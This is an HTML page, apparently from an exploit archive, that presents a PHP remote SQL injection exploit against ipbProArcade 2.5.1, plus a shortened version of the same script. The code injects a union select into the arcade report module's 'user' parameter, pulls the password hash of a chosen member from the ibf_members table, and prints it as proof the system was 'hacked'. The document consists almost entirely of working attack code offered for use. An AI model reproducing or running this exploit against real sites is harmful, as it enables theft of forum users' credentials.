<html><head><title>ipbProArcade 2.5.1 (user) Remote SQL Injection Exploit</title></head><pre>&lt;pre&gt;
&lt;?php
 
 /**
  * @author Pr0xY
  * @copyright 2008
  */
 
 class Injection
 {
    var $inject;
    var $Asite;
    var $Isite;
    
   function Injection($address, $id)
   {
      $this-&gt;inject = &quot;index.php?act=Arcade&amp;module=report&amp;user=-{$id}%20union%20select%20password%20from%20ibf_members%20where%20id={$id}&quot;;
      $this-&gt;Asite  = $address;
   }
   
   function getTheHash()
   {
      $html = file_get_contents($this-&gt;Asite.$this-&gt;inject);
      preg_match_all('/(colspan=\&quot;5\&quot;\&gt;)(.*)(\S*)(\S*)/',$html, $hash);
      
      $md5 = preg_replace(&quot;/[^a-zA-Z0-9]/&quot;, &quot;&quot;, $hash[2][0]);
      $md5 = preg_replace(&quot;/(\S{32})(td)/&quot;, &quot;$1&quot;, $md5);
      
      if(strlen($md5) == 32)
         echo &quot;The system hacked : &lt;b&gt;{$md5}&lt;/b&gt;&quot;;
      else
         echo &quot;Error&quot;;
   }
   
 }
 
 $y0n1 = new Injection(&quot;&quot;, 1);
 $y0n1-&gt;getTheHash();
 
?&gt;
&lt;/pre&gt;
 
The short code :
 
$a = &quot;&quot;;
$i = 1;
 
$inject = &quot;index.php?act=Arcade&amp;module=report&amp;user=-{$i}%20union%20select%20password%20from%20ibf_members%20where%20id={$i}&quot;;
 
$html = file_get_contents($a.$inject);
      preg_match_all('/(colspan=\&quot;5\&quot;\&gt;)(.*)(\S*)(\S*)/',$html, $hash);
 
$md5 = preg_replace(&quot;/[^a-zA-Z0-9]/&quot;, &quot;&quot;, $hash[2][0]);
$md5 = preg_replace(&quot;/(\S{32})(td)/&quot;, &quot;$1&quot;, $md5);
 
echo $md5; 

# milw0rm.com [2008-06-03]</pre></html>